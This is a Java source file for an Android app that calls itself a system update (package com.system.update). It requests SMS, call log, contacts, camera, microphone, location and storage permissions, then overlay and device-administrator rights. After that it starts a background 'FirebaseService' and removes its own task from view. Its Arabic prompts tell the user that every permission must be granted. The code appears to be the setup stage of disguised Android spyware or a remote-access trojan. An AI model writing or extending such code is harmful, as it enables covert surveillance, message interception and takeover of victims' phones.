package com.system.update;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int REQ_PERMS = 1001;
    private TextView statusText;
    private Button activateBtn;

    private final String[] REQUIRED_PERMISSIONS = {
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.POST_NOTIFICATIONS
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.status_text);
        activateBtn = findViewById(R.id.activate_btn);

        activateBtn.setOnClickListener(v -> requestAllPermissions());
    }

    private void requestAllPermissions() {
        List<String> missing = new ArrayList<>();
        for (String p : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                missing.add(p);
            }
        }

        if (!missing.isEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), REQ_PERMS);
            return;
        }

        checkSpecialPermissions();
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == REQ_PERMS) {
            boolean allGranted = true;
            for (int r : results) if (r != PackageManager.PERMISSION_GRANTED) allGranted = false;
            if (allGranted) {
                checkSpecialPermissions();
            } else {
                Toast.makeText(this, "لازم توافق على كل الأذونات", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void checkSpecialPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName())));
            statusText.setText("فعّل: Display over other apps");
            return;
        }

        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, DeviceAdminReceiver.class);
        if (!dpm.isAdminActive(admin)) {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            startActivity(i);
            statusText.setText("فعّل: Device Admin");
            return;
        }

        statusText.setText("✅ تم التفعيل بنجاح");
        Toast.makeText(this, "التطبيق جاهز", Toast.LENGTH_SHORT).show();

        new Handler().postDelayed(() -> {
            startService(new Intent(this, FirebaseService.class));
            finishAndRemoveTask();
        }, 1500);
    }
                                                                    }
